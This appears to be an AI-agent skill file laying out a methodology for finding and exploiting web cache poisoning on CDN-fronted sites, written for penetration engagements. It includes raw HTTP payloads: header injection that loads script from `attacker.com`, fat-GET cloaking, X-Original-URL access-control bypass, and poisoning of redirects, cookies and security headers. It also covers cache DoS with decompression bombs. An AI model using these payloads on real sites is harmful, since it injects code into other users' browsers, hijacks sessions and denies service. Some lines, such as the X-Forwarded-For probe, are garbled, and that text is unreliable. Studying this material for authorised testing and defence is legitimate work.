---
name: web-cache-poisoning
description: Detect and exploit Web Cache Poisoning (WCP) and Web Cache Deception variants via unkeyed header reflection, cache-key denormalization, fat GET, and route/path confusion.
---

# Web Cache Poisoning

## When to use this skill

Use when a target sits behind a CDN, reverse proxy, or cache (Cloudflare, Akamai, Fastly, CloudFront, Varnish, Nginx, Squid) and any response is dynamically generated from attacker-controllable headers. Goal: make the cache store a poisoned response that is served to other users — JS injection, XSS, redirect, DoS.

## Methodology

### 1. Fingerprint the cache & CDN

```
Response headers:
  X-Cache: hit/miss          → Varnish, Cloudflare, some CDNs
  X-Cache-Status: MISS/HIT/EXPIRED/BYPASS   → Nginx cache
  CF-Cache-Status: HIT/MISS/DYNAMIC/BYPASS  → Cloudflare
  X-Served-By / X-Cache-Hits / Age / X-Served-By → Fastly
  X-From-Cache / X-Cacheable: NO            → generic
  Age: 0/1234                               → generic, present on all caches
  X-Varnish / Via: varnish                  → Varnish
  X-Edge-Location / X-Amz-Cf-Id             → CloudFront
  Via: 1.1 google                           → Google Cloud CDN
  Via: 1.1 varnish / X-Served-By: cache-lhr → Fastly
  X-Powered-By: PHP/7.4 → no cache, but signals backend tech
```

Use distinct values for cache-buster query param (`?cb=123456789`) — a random UUID each test so each probe is a fresh cache entry.

### 2. Identify unkeyed inputs

Send a probe with an injectable header and check for reflection:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 443
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0 part of reflected HTML (e.g. resource URLs, canonical link, CSP, Location, set-cookie domain)
```

If `X-Backend-Server` header or HTML reflects `<base href=...>` or resource URLs built with `X-Forwarded-Host`, you have a candidate.

### 3. Verify the reflection is cached

```http
GET /?cb=1234 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

→ Response contains attacker.com in HTML (cache MISS, poisoned)
→ Re-request GET /?cb=1234 (no header) → response STILL contains attacker.com (cache HIT, poisoned persistently) → confirmed WCP
```

Classic payload — resource import hijack:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com</script><script src=//attacker.com/p.js></script>
```

### 4. Pick an exploitable payload

If poisoning only the homepage is limited, look for:

- **Resource URL poisoning**: any JS/CSS/image URL in the response — poisoning it loads attacker JS on every visitor's browser. Check `src=`, `href=`, `action=`, `data-*`.
- **CSP / SRI bypass** if CSP is only defined for the origin, poisoning a subresource that's loaded with `crossorigin` may not be covered by CSP.
- **`X-Forwarded-Scheme: http` → force a redirect to `https`** if the app redirects http→https and the cache stores the 301/302 — every visitor who follows the link is redirected to attacker's `https` version of the resource, giving a `Location: https://attacker.com/...`.
- **Set-Cookie injection** (see `http-desync` for the `Content-Length` variant) — poisoning with `Set-Cookie: session=attacker`.
- **Reflected CSP / X-Frame-Options** — strip or rewrite security headers for every visitor (severe: strips XSS protections for all users).
- **`X-Forwarded-Port: 443` → inject `X-Forwarded-Port: 443` to force redirect Location to be `http://attacker.com`** — rare but check.
- **Path/header-only poisoning**: if only `/` is cacheable, target the page every user hits.

### 5. Cache-key denormalization

If `X-Origin-IP` is used to resolve the origin, check:

- `X-Forwarded-Host` builds resource URLs
- `X-Forwarded-Scheme` flips to `http` → forces a redirect
- `X-Original-URL` / `X-Rewrite-URL` — not standard headers, but supported by Nginx, Apache (mod_rewrite), IIS and many frameworks. If access control is enforced on the **path the proxy sees** but routing uses the overridden header, you get access-control bypass:
```http
GET /anything-unprotected HTTP/1.1
Host: target.com
X-Original-URL: /admin
```
- If the response is the admin page while unauthenticated → **routing-based access control bypass** (chain with `idor` / `auth-bypass` techniques).
- Variants worth probing: `X-Override-URL`, `X-HTTP-Method-Override`, `X-Rewrite-URL`, `X-Original-URL` + `X-Rewrite-URL` combined (one controls routing, the other access control — flip both independently).

`X-Original-URL`/`X-Rewrite-URL` also gives you a route confusion attack if the access control is done by path in a WAF/proxy that doesn't re-write Host-based routing.

### 6. Fat GET / parameter cloaking

Some frameworks (PHP, Express, Spring, Rails) merge `Content-Length` body params **over** the query-string params. The cache keys on the URL (which looks innocent), while the app renders the body-supplied value — so you poison the page without anything attacker-controlled ever appearing in the cache key:

```http
GET /?param1=x&param2=y HTTP/1.1
Host: target.com
Content-Length: 22

param1=evil&padding=xx
```

If the response reflects `evil` for the URL `/?param1=x&param2=y`, every later visitor to that exact URL (no buster, no body) gets your payload from cache. Same trick as HTTP/2 pseudo-header cloaking and `;`-delimiter confusion (`param=clean;param=evil` — one parser takes the first, the other the last).

### 7. Multi-layer caches & re-cache DoS

- **Layered caches**: CDN edge (fastly/cloudflare) → Varnish/nginx proxy cache → application-level cache can each key differently. Poison at the layer with the **longest TTL / widest key** — a header ignored by the edge may still be unkeyed at the origin layer. Identify each layer by differing `Age`, `X-Cache`, `CF-Ray`/`X-Served-By` and per-layer cache busters.
- **`Vary` smuggling**: an attacker-influenced `Vary` response header (e.g. reflected via `X-Forwarded-Host`) adds a *new* dimension to the cache key on the poisoned entry, splitting the cache and pinning your payload for that `Vary` value.
- **Re-cache DoS**: poison a resource with a response that breaks the page (unclosed `<script>`, infinite redirect loop, 2 GB decompression bomb) — or chain with a DOM sink so every re-cache re-executes. Verify persistence by re-poisoning across the TTL window (see "re-cached denial of service" in the References).
- **Redirect poisoning**: if the origin 301s based on an unkeyed header (`X-Forwarded-Scheme: http` → `Location: http://attacker.com/...`), the cache stores the redirect itself — every visitor to the key follows it.

### 8. Route confusion / origin override

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

If the application builds absolute resource URLs from the Host header (canonical links, redirects, email links, `src`/`href` generation), an attacker-controlled override routes the victim's browser to attacker infrastructure. Test every host-resolution candidate header and verify where the generated URL actually lands:

- `X-Forwarded-Host`, `X-Host`, `X-Host-Override`, `X-HTTP-Host-Override`, `X-Original-Host`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Server`, `X-HTTP-Origin`, `X-Forwarded-Port`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Forwarded-Ssl`, `X-URL-Scheme`, `X-Prerender-Token`
- VHost routing: if the front end routes by `Host` to different backends, pointing it at a vhost whose web root you control (or that echoes input) gives direct resource injection into the victim's cache-key path.
- Router/ACL confusion via `X-Original-URL` / `X-Rewrite-URL` reaching otherwise-blocked paths is covered in the `idor` skill.

### 9. Chain with other bugs

- **Poison with JS injection → session fixation**: cache `Set-Cookie: session=attacker_session` on a shared path; see `xss-stored` for the exfil chain.
- **Poison self-SSRF**: make the cache key on a URL the origin fetches internally and capture the internal response (see `ssrf` skill).
- **Web Cache Deception** is a separate skill (`cache-deception`) — path confusion + static-extension appending to force a victim's authenticated response into a cacheable, attacker-readable entry.
- **Chained with request smuggling** (`http-request-smuggling` / `http-desync`): a desync lets one front-end request append a smuggled poisoned request whose response is stored under a victim's URL — historically the account-takeover vector of choice (`Set-Cookie: session=attacker`).

## References

- PortSwigger Web Security Academy: Web Cache Poisoning, Web Cache Poisoning with an unknown header, Web Cache Poisoning via an unkeyed query string, Web Cache Poisoning with multiple layers, "Web Cache Poisoning to exploit a DOM vulnerability with a re-cached denial of service"
- James Kettle — "Practical Web Cache Poisoning" (2018), "Web Cache Entanglement" (2020)
- `param miner` (Burp extension) — hidden header discovery, unkeyed params, cache-buster injection
- RFC 7234 (HTTP caching), RFC 9111 (HTTP caching, current)

## Tooling

- `param miner` (Burp) — hidden header/param discovery, cache-buster injection
- `curl -H` with cache buster — one-shot probe/verify
- `httpx` / `ffuf` — fingerprint the caching layer and key-affinity
- `nuclei` templates — known CDN poisoning fingerprints
- Burp Repeater + Extender (`Turbo Intruder` for fast cache-buster spraying)

## Verification & Deliverables
A complete engagement run of this skill produces:
- Cache fingerprint matrix: CDN/proxy identified, cache-control behavior, keyed vs unkeyed header list (Param Miner output).
- Evidence pair for each poisoned parameter: poisoned request + cached response showing attacker-controlled content served to other users (`X-Cache: HIT`).
- Exploitation proof at real impact: script injection toward victims, HTML injection, web-cache DoS demonstration, or origin override capture.
- Confirmation that a victim (curl without attacker cookies) receives the poisoned object, not just the attacker.
- Remediation ticket: keyed-header fix, Vary corrections, cache-control hardening, and re-test showing the poison no longer persists.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.